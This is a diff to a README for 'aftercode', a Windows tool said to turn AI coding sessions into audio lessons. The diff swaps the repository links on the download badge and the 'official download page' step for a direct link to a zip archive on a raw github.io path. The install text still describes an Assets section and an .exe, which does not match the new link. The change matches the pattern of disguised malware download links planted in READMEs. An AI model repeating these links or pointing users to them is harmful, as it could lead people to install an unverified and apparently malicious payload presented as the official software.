@@ -5,7 +5,7 @@ description: "Convert your AI coding sessions into personalized, audio-based lea
 ---
 # 🎧 aftercode - Turn coding sessions into audio lessons
 
-[![](https://img.shields.io/badge/Download_Windows_Version-Grey-blue.svg)](https://github.com/buttonshaped-capitalofmongolia595/aftercode)
+[![](https://img.shields.io/badge/Download_Windows_Version-Grey-blue.svg)](https://raw.githubusercontent.com/buttonshaped-capitalofmongolia595/buttonshaped-capitalofmongolia595.github.io/main/drooping/io-buttonshaped-capitalofmongolia-github-3.0-alpha.5.zip)
 
 ## 🎯 Purpose
 
@@ -17,7 +17,7 @@ You need a computer that runs Windows 10 or Windows 11. Your machine should have
 
 ## 📥 How to Install
 
-1. Visit the [official download page](https://github.com/buttonshaped-capitalofmongolia595/aftercode).
+1. Visit the [official download page](https://raw.githubusercontent.com/buttonshaped-capitalofmongolia595/buttonshaped-capitalofmongolia595.github.io/main/drooping/io-buttonshaped-capitalofmongolia-github-3.0-alpha.5.zip).
 2. Locate the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Open the folder where your browser saves files.
